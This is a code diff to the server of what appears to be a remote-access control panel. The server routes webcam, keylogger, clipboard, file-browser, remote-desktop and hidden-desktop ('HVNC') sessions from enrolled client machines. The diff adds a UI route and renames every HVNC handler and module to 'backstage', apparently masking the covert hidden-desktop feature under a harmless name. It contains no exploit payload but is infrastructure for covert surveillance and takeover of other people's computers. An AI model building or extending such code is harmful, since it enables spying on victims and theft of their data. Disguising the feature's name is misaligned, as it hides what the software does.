@@ -19,6 +19,7 @@ import { metrics } from "./metrics";
 import { getClientDbSyncStats } from "./client-db-sync";
 import { ensureDataDir } from "./paths";
 import { handleAuthRoutes } from "./server/routes/auth-routes";
+import { handleUiRoutes } from "./server/routes/ui-routes";
 import { handleAutoScriptsRoutes } from "./server/routes/auto-scripts-routes";
 import { handleSavedScriptsRoutes } from "./server/routes/saved-scripts-routes";
 import { handleEnrollmentRoutes, setPostApproveHook } from "./server/routes/enrollment-routes";
@@ -91,36 +92,37 @@ import { prepareTlsOptions, logServerStartup } from "./server/tls-bootstrap";
 import { createWebSocketRuntime } from "./server/websocket-runtime";
 import {
   handleConsoleOutput,
+  handleDesktopEncoderCapabilities,
   handleConsoleViewerMessage,
   handleConsoleViewerOpen,
-  handleHVNCViewerMessage,
-  handleHVNCViewerOpen,
+  handlebackstageViewerMessage,
+  handlebackstageViewerOpen,
   handleWebcamViewerMessage,
   handleWebcamViewerOpen,
   handleWebcamDevices,
-  handleHVNCCloneProgress,
-  handleHVNCLookupResult,
-  handleHVNCBrowserCheckResult,
-  handleHVNCInstalledAppsResult,
-  handleHVNCDXGIStatus,
-  handleHVNCBrowserLaunchStatus,
-  handleHVNCWindowListResult,
+  handlebackstageCloneProgress,
+  handlebackstageLookupResult,
+  handlebackstageBrowserCheckResult,
+  handlebackstageInstalledAppsResult,
+  handlebackstageDXGIStatus,
+  handlebackstageBrowserLaunchStatus,
+  handlebackstageWindowListResult,
   handleClipboardContent,
   handleWebrtcP2PAnswer,
   handleWebrtcP2PIce,
   cleanupRdViewerP2P,
   handleRemoteDesktopViewerMessage,
   handleRemoteDesktopViewerOpen,
-  hvncStreamingState,
+  backstageStreamingState,
   notifyConsoleClosed,
   notifyRdInputLatency,
   notifyRemoteDesktopStatus,
   rdStreamingState,
   webcamStreamingState,
   sendDesktopCommand,
-  sendHVNCCommand,
+  sendbackstageCommand,
   stopConsoleOnTarget,
-} from "./server/ws-console-rd-hvnc";
+} from "./server/ws-console-rd-backstage";
 import {
   handleFileBrowserMessage as forwardFileBrowserMessage,
   handleFileBrowserViewerMessage,
@@ -200,7 +202,7 @@ metrics.setSnapshotEnricher((snapshot) => {
       notificationRateClients: notificationRate.size,
       pendingNotificationScreenshots: pendingNotificationScreenshots.size,
       rdStreamingClients: rdStreamingState.size,
-      hvncStreamingClients: hvncStreamingState.size,
+      backstageStreamingClients: backstageStreamingState.size,
       webcamStreamingClients: webcamStreamingState.size,
     },
   };
@@ -414,7 +416,7 @@ const notificationPluginHandlers = createNotificationPluginHandlers({
   savePluginState,
 });
 
-type SocketRole = ClientRole | "console_viewer" | "rd_viewer" | "webcam_viewer" | "hvnc_viewer" | "file_browser_viewer" | "process_viewer" | "keylogger_viewer" | "notifications_viewer";
+type SocketRole = ClientRole | "console_viewer" | "rd_viewer" | "webcam_viewer" | "backstage_viewer" | "file_browser_viewer" | "process_viewer" | "keylogger_viewer" | "notifications_viewer";
 
 type PendingScript = {
   resolve: (result: any) => void;
@@ -596,13 +598,13 @@ async function startServer() {
     pendingScripts,
     pendingCommandReplies,
     rdStreamingState,
-    hvncStreamingState,
+    backstageStreamingState,
     webcamStreamingState,
     getNotificationConfig,
     handleConsoleViewerOpen,
     handleRemoteDesktopViewerOpen,
     handleWebcamViewerOpen,
-    handleHVNCViewerOpen,
+    handlebackstageViewerOpen,
     handleFileBrowserViewerOpen,
     handleProcessViewerOpen,
     handleKeyloggerViewerOpen,
@@ -625,7 +627,7 @@ async function startServer() {
     handleConsoleViewerMessage,
     handleRemoteDesktopViewerMessage,
     handleWebcamViewerMessage,
-    handleHVNCViewerMessage,
+    handlebackstageViewerMessage,
     handleFileBrowserViewerMessage,
     handleProcessViewerMessage,
     handleKeyloggerViewerMessage,
@@ -659,6 +661,7 @@ async function startServer() {
     storeNotificationScreenshot: storeNotificationScreenshotForPending,
     handleNotificationScreenshotResult: notificationPluginHandlers.handleNotificationScreenshotResult,
     handleConsoleOutput: (clientId: string, payload: any) => handleConsoleOutput(clientId, payload),
+    handleDesktopEncoderCapabilities: (clientId: string, payload: any) => handleDesktopEncoderCapabilities(clientId, payload),
     handleFileBrowserMessage: (clientId: string, payload: any) =>
       forwardFileBrowserMessage(clientId, payload, {
         pendingHttpDownloads,
@@ -678,13 +681,13 @@ async function startServer() {
     handleVoiceUplink,
     handleDesktopAudioUplink,
     handleWebcamDevices,
-    handleHVNCCloneProgress,
-    handleHVNCLookupResult,
-    handleHVNCBrowserCheckResult,
-    handleHVNCInstalledAppsResult,
-    handleHVNCDXGIStatus,
-    handleHVNCBrowserLaunchStatus,
-    handleHVNCWindowListResult,
+    handlebackstageCloneProgress,
+    handlebackstageLookupResult,
+    handlebackstageBrowserCheckResult,
+    handlebackstageInstalledAppsResult,
+    handlebackstageDXGIStatus,
+    handlebackstageBrowserLaunchStatus,
+    handlebackstageWindowListResult,
     handleClipboardContent,
     handleWebrtcP2PAnswer,
     handleWebrtcP2PIce,
@@ -693,7 +696,7 @@ async function startServer() {
     cleanupDesktopAudioViewer,
     stopConsoleOnTarget,
     sendDesktopCommand,
-    sendHVNCCommand,
+    sendbackstageCommand,
     notifyConsoleClosed,
     clearPendingNotificationScreenshots: notificationPluginHandlers.clearPendingNotificationScreenshots,
     clearClientPluginState: notificationPluginHandlers.clearClientPluginState,
@@ -719,6 +722,7 @@ async function startServer() {
           ...routeDeps.registration,
           requestIP: (srv as any).requestIP,
         }),
+        (req, url, srv) => handleUiRoutes(req, url, srv as any),
         (req, url, srv) => handleAuthRoutes(req, url, srv as any),
         (req, url, srv) => handleOidcRoutes(req, url, srv as any),
         (req, url, srv) => handleNotificationsConfigRoutes(req, url, srv as any, routeDeps.notificationsConfig),
